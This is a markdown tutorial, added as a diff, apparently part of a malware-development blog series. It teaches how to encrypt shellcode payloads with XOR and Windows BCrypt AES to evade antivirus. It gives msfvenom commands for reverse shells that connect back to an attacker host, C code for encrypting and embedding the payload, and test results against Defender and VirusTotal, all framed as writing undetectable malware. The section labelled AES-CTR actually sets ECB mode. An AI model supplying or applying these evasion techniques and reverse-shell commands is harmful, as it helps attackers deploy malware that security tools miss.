@@ -1,0 +1,175 @@
+> Today we are going to learn what is encryption and why do we need it. And we'll also test how undetectable is our program. You don't have to become cryptographer to learn malware development, so take a chill pill and enjoy..
+# Prerequisites
+Do yourself a favor and learn the following topics before staring
+1. **Encryption:** Symmetric vs. Asymmetric
+2. **Basic Terms:** Cipher, Ciphertext, Key
+3. **Modes of AES**: CTR, CBC, CFB, OFB, GCM etc
+
+*Entropy* - Entropy refers to the randomness or unpredictability of a program. High entropy makes it harder for antivirus (AV) software to analyze or flag your binary.
+Ways to increase entropy:
+- Encrypting or packing payloads
+- Inserting junk instructions
+- Control flow obfuscation
+
+*XOR* - A basic encryption method that performs a binary XOR operation on each byte. It’s fast and simple but weak — easy to reverse and often detected by AVs.
+
+| A   | B   | output |
+| --- | --- | ------ |
+| 0   | 0   | 0      |
+| 0   | 1   | 1      |
+| 1   | 0   | 1      |
+| 1   | 1   | 0      |
+
+*Heuristic detection* - A malware detection technique where the AV watches the program’s behavior and patterns instead of relying on fixed signatures.
+# Payload Encryption
+Encrypting your payload boosts entropy and reduces static signature detection. But beware: **encryption alone doesn’t guarantee evasion**, especially if the rest of the binary has red flags.
+
+### XOR
+XOR is simple and fast, but unreliable for real evasion — **easily reversible** and frequently flagged by AV.
+
+1. Now it's self explanatory what the code is doing, it's getting the all the bytes from the variable shellcode and XORing it with the key.
+2. Mind that the `BYTE` is an windows datatype, so have to import `windows.h`.
+```c
+#include <stdio.h>
+#include <windows.h>
+
+// this is an linux reverse shell
+// msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.2 LPORT=4444 -f c
+
+void main() {
+	unsigned char shellcode[] = 
+	"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
+	// Make your own shellcode
+	"\xff\xd5";
+
+	BYTE key = 0x80;
+	unsigned char EncryptedShellcode[sizeof(shellcode)];
+
+	for(int i=0; i<sizeof(shellcode); i++)
+	{
+		EncryptedShellcode[i] = shellcode[i] ^ (key + i);				
+	}
+	
+	for(int i=0; i<sizeof(EncryptedShellcode); i++)
+	{
+		printf("0x%02X, ",EncryptedShellcode[i]);
+	}
+	
+}
+```
+
+3. Now copy the output of the above code and just place it in the `buf` variable and try running it. We are testing this against windows defender.
+```c
+#include <stdio.h>
+void main(){
+
+// payload is XORed
+
+  unsigned char buf[] = {0x7C, 0x69, 0x00, 0x83, 0x84, 0x85, 0xE6, 0x0E, 0x6D, 0xB8,
+  // XORed shellcode here
+  0xD1, 0xD5, 0xC0, 0x92, 0x3D, 0x16, 0xC4};
+
+  printf("[+] Suckcess ");
+  getchar();
+
+}
+```
+
+### AES-CTR
+AES-CTR means AES encryption in CTR (counter) mode. It's much better than XOR.
+![your internet sucks image not loaded](/images/PayloadEncryption-1.png)
+- **Nonce (IV)** - A pseudo-random initialization vector
+- **Key** - Your symmetric encryption key
+- **counter**  - Increments per block (0, 1, 2...)
+
+AES encrypts `IV || counter` with the key to generate a **keystream**, which is then **XORed with the plaintext** to produce the ciphertext.
+
+We will use [Windows API](https://learn.microsoft.com/en-us/windows/win32/seccng/typical-cng-programming?source=recommendations) to make our cipher. we will use Bcrypt to import the necessary functions to encrypt our payload.
+1. Generate shellcode with the following command
+   `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.10 LPORT=60123 -f c`
+2. As always help yourself with the docs to understand the meaning of functions.
+
+```c
+#include <stdio.h>
+#include <windows.h>
+#include <bcrypt.h>
+
+int main() {
+    BCRYPT_ALG_HANDLE algoHandler = NULL;
+    BCRYPT_KEY_HANDLE keyHandler = NULL;
+    UCHAR keyObject[654] = {0};
+    UCHAR key[128] = {0};
+    UCHAR Encrypted[514] = {0};
+    DWORD cbEncrypted = 0;
+
+    UCHAR data[] =
+        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
+        "\xff\xd5"; // Your shellcode
+
+    // Generate random key
+    BCryptGenRandom(NULL, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    // Initialize algorithm
+    BCryptOpenAlgorithmProvider(&algoHandler, BCRYPT_AES_ALGORITHM, NULL, 0);
+    BCryptSetProperty(algoHandler, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
+                      sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
+
+    // Generate key handle
+    BCryptGenerateSymmetricKey(algoHandler, &keyHandler, keyObject,
+                               sizeof(keyObject), key, sizeof(key), 0);
+
+    // Encrypt
+    BCryptEncrypt(keyHandler, data, sizeof(data), NULL, NULL, 0,
+                  Encrypted, sizeof(Encrypted), &cbEncrypted, BCRYPT_BLOCK_PADDING);
+
+    // Print encrypted shellcode
+    printf("[+] Encrypted data:\n");
+    for (DWORD i = 0; i < cbEncrypted; i++) {
+        printf("0x%02X, ", Encrypted[i]);
+    }
+
+    // Cleanup
+    BCryptDestroyKey(keyHandler);
+    BCryptCloseAlgorithmProvider(algoHandler, 0);
+}
+```
+3. **Bonus tip** - Always look out for the size of the `KEY` and `KEY_OBJECT`  as they vary for every algo and if you don't follow them, there won't be any errors and you'll waste hours of your time. just like I did😑. You can use something like this to verify it
+```c
+// Verify key object size
+    DWORD cbKeyObject = 0;
+    status = BCryptGetProperty(algoHandler, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
+    if (!BCRYPT_SUCCESS(status)) {
+        printf("BCryptGetProperty (object length) failed: 0x%08X\n", status);
+        BCryptCloseAlgorithmProvider(algoHandler, 0);
+        return 1;
+    }
+    if (sizeof(keyObject) < cbKeyObject) {
+        printf("Key object buffer too small: need %lu bytes\n", cbKeyObject);
+        BCryptCloseAlgorithmProvider(algoHandler, 0);
+        return 1;
+    }
+```
+4. So now we test this against the `Microsoft Defender`
+```c
+#include <stdio.h>
+
+void main(){
+    unsigned char buf[] = {0x54, 0xAF, 0x96, 0x81, 0x0C, 0x32, 0xA1, 0x37, 0xB9, 0x81,
+    // Make your own shellcode
+    0xAB, 0xA7 };
+
+    printf("[+] Suckcess");
+    getchar();
+}
+```
+![your internet sucks image not loaded](/images/PayloadEncryption-2.png)
+# Why this doesn't work ??
+## AES-CTR / XOR doesn't work against Virustotal ??
+![your internet sucks image not loaded](/images/PayloadEncryption-3.png)
+Still this is a pretty good detection rate but we need to understand why even those 3 AV flags our malware. It's because - 
+- **Huge arrays of bytes** sitting idle is suspicious.
+- AVs pre-index common shellcode **and their XOR/AES variants**.
+- **High entropy** from encrypted blobs makes binaries stand out.
+
+## Can We Beat VirusTotal?
+Yes we can, but I think we should worry more about writing malware first 😂. will cover this after some time.
